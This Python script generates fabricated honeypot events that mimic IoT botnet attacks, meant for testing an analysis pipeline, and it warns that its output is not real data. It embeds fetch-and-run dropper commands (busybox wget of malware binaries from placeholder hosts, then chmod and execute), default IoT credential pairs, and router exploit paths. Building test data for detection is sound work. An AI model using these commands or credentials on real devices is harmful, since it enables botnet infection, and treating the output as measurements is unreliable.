#!/usr/bin/env python3
"""Generate SYNTHETIC events to test the analysis pipeline.

!!! The output is fabricated. It uses documentation-only ASNs (AS64496-64511),
!!! fictional ISP/country names and IDs prefixed with "SYN-". Never present it
!!! as measured data in a report or portfolio.

Usage:  python make_sample_data.py out_dir [--n 3000] [--days 14] [--seed 7]
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
from datetime import datetime, timedelta, timezone

ASNS = [  # (asn, isp, country) -- all fictional, heavy-tailed weights below
    ("AS64496", "Example-Telecom-A", "Country-A"), ("AS64497", "Example-Broadband-B", "Country-B"),
    ("AS64498", "Example-Cloud-C", "Country-C"), ("AS64499", "Example-Mobile-D", "Country-A"),
    ("AS64500", "Example-Hosting-E", "Country-D"), ("AS64501", "Example-ISP-F", "Country-E"),
    ("AS64502", "Example-Net-G", "Country-B"), ("AS64503", "Example-Net-H", "Country-C"),
    ("AS64504", "Example-Net-I", "Country-F"), ("AS64505", "Example-Net-J", "Country-G"),
]
WEIGHTS = [30, 18, 12, 10, 8, 6, 5, 4, 4, 3]
FAMILIES = ["mirai.arm7", "mozi.m", "bins.sh", "x86_64", "mips", "xmrig.arm", "okiru.arm5", "gafgyt.mpsl"]
TECH = {
    "T1190": "Exploit Public-Facing Application", "T1059.004": "Unix Shell",
    "T1105": "Ingress Tool Transfer", "T1110.001": "Password Guessing",
    "T1082": "System Information Discovery", "T1496": "Resource Hijacking",
}
CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "root"), ("admin", "1234"),
         ("user", "user"), ("root", "888888"), ("support", "support"), ("root", "juantech"), ("guest", "12345")]


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("out_dir")
    ap.add_argument("--n", type=int, default=3000)
    ap.add_argument("--days", type=int, default=14)
    ap.add_argument("--seed", type=int, default=7)
    a = ap.parse_args()
    rnd = random.Random(a.seed)
    os.makedirs(a.out_dir, exist_ok=True)
    start = datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0) - timedelta(days=a.days)

    hosts = [f"198.51.100.{i}" for i in range(1, 25)]  # TEST-NET-2 payload hosts
    lines = []
    for i in range(a.n):
        asn, isp, country = rnd.choices(ASNS, WEIGHTS)[0]
        ts = start + timedelta(seconds=rnd.random() * a.days * 86400)
        proto = rnd.choices(["HTTP", "ADB", "TELNET", "RAW"], [45, 20, 30, 5])[0]
        port = {"HTTP": rnd.choice([7547, 5555]), "ADB": 5555, "TELNET": 2323, "RAW": rnd.choice([5555, 7547])}[proto]
        ev = {
            "id": f"SYN-{i:06d}", "timestamp": ts.isoformat().replace("+00:00", "Z"),
            "src_ip": f"203.0.113.{rnd.randint(1, 254)}", "src_port": rnd.randint(1024, 65535),
            "dst_port": port, "protocol": proto, "action": f"{proto} synthetic",
            "bytes_received": rnd.randint(0, 5000), "session_duration_ms": rnd.randint(50, 20000),
            "iocs": {}, "mitre": [], "geo": {"country": country, "isp": isp, "asn": asn, "resolved": True},
            "alert_sent": False,
        }
        techs: list[str] = []
        if proto == "HTTP":
            ev.update(http_method=rnd.choice(["GET", "POST"]), http_path=rnd.choice(
                ["/", "/UD/act?1", "/boaform/admin/formLogin", "/setup.cgi", "/GponForm/diag_Form"]),
                user_agent=rnd.choice(["Hello-World", "curl/7.68.0", "Mozilla/5.0", "Go-http-client/1.1"]))
            if ev["http_path"] != "/" and rnd.random() < 0.8:
                techs.append("T1190")
        if proto == "TELNET":
            n = rnd.choice([0, 2, 2, 3, 5])
            ev["credentials"] = [dict(zip(("username", "password"), rnd.choice(CREDS))) for _ in range(n)]
            if n >= 2:
                techs.append("T1110.001")
                if rnd.random() < 0.6:
                    ev["commands"] = ["/bin/busybox ECCHI", "uname -a"] if rnd.random() < .5 else ["cd /tmp; wget http://x/y"]
        if proto in ("ADB", "TELNET", "HTTP") and rnd.random() < 0.45:
            techs += ["T1059.004"]
            host, fam = rnd.choice(hosts), rnd.choice(FAMILIES)
            url = f"http://{host}/bins/{fam}"
            ev["iocs"] = {"urls": [url], "download_urls": [url], "ips": [host]}
            techs.append("T1105")
            if proto == "ADB":
                ev["commands"] = rnd.choice([
                    ["cd /data/local/tmp", f"busybox wget {url}", "chmod 777 " + fam, "./" + fam],
                    ["getprop ro.product.model", "pm list packages", f"curl -O {url}", "sh " + fam],
                    ["uname -a", "cat /proc/cpuinfo", f"busybox wget {url} -O x", "chmod +x x", "./x", "rm x"],
                ])
            ok = rnd.random() < 0.55
            sha = hashlib.sha256(f"{fam}-{rnd.randint(0, 40)}".encode()).hexdigest()
            ev["downloads"] = [{"url": url, "success": ok, "status": "Downloaded" if ok else
                                "Download Failed (Dead Link or Timeout)", "duration_ms": rnd.randint(50, 5000),
                                **({"sha256": sha, "filename": sha + ".bin", "size": rnd.randint(2000, 900000),
                                    "file_type": rnd.choice(["ELF", "ELF", "script"])} if ok else {})}]
            if "xmrig" in fam:
                techs.append("T1496")
            ev["alert_sent"] = rnd.random() < 0.7
        if proto == "ADB" and rnd.random() < 0.35:
            # adb push / echo-assembled dropper (SYNTHETIC)
            fam = rnd.choice(FAMILIES)
            sha = hashlib.sha256(f"push-{fam}-{rnd.randint(0, 25)}".encode()).hexdigest()
            via = rnd.choices(["adb-sync-push", "shell-write"], [70, 30])[0]
            ok = rnd.random() < 0.9
            ev["dropped"] = [{
                "path": rnd.choice(["/data/local/tmp/" + fam.split(".")[0], "/data/local/tmp/.x", "/sdcard/update.apk"]),
                "via": via, "mode": rnd.choice(["0755", "0777"]), "executable": True,
                "success": ok, "status": "Saved" if ok else "Not Saved (Storage Quota Reached)",
                **({"sha256": sha, "filename": sha + ".bin", "size": rnd.randint(4000, 1_500_000),
                    "file_type": rnd.choice(["ELF", "ELF", "zip/apk/jar", "script"])} if ok else {}),
            }]
            ev["action"] = "ADB shell + push"
            techs += ["T1105", "T1059.004"]
            ev["alert_sent"] = rnd.random() < 0.7
        if rnd.random() < 0.1 and proto != "HTTP":
            techs.append("T1082")
        ev["mitre"] = [{"id": t, "name": TECH[t]} for t in sorted(set(techs))]
        lines.append(ev)

    lines.sort(key=lambda e: e["timestamp"])
    path = os.path.join(a.out_dir, "events-SYNTHETIC.jsonl")
    with open(path, "w", encoding="utf-8") as fh:
        for ev in lines:
            fh.write(json.dumps(ev) + "\n")
    print(f"wrote {len(lines)} SYNTHETIC events to {path}")


if __name__ == "__main__":
    main()
